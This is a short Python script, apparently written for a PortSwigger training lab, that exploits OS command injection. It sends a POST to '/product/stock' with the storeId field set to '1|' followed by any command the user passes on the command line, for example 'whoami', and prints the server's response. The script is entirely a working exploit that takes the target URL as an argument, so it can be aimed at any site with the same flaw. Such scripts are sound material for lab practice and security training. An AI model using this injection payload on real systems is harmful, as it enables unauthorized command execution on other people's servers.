# This script is made with the refernce to the portswigger labs #1 
# Please understand the tool and make modifications according to your like

# importing the modules...
import requests # pip3 install requests if module not found error hits 
import sys      # system argvs
import urllib3  #  i don't want to see the cert.error

# make sure everything goes to my proxy
proxies = {"http": 'http://127.0.0.1:8000', "https": 'http://127.0.0.1:8080'} 

# disable the error warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) 


def running(url, cmd):
	path = '/product/stock' # vulnerable path
	inject = "1|" + cmd      
	parameters = {'productId': '1', 'storeId': inject} # specified params with injection point
	go = requests.post(url + path , data=parameters, proxies=proxies, verify=False) 
	if len(go.text) == 13:   # don't use this hardcoded length and make changes accoring to responses or sonething
		print("Output: " + go.text) # output on success 
		print("Injection succesful : data retrived")
	else:
		print("BAD LUCK!")	 # output on failure

def main():
	print("Hey BABY!!!") # manual of instructions  haha
	if len(sys.argv) != 3: # length of system arguments
		print(" Try : %s <url> <cmd> " % sys.argv[0])
		print("Example: %s test.com whoami" % sys.argv[0])
		sys.exit(-1)
		
	url = sys.argv[1]
	cmd = sys.argv[2]
	print("Running for  uh...")
	running(url, cmd)

if __name__ == "__main__": 
	main()
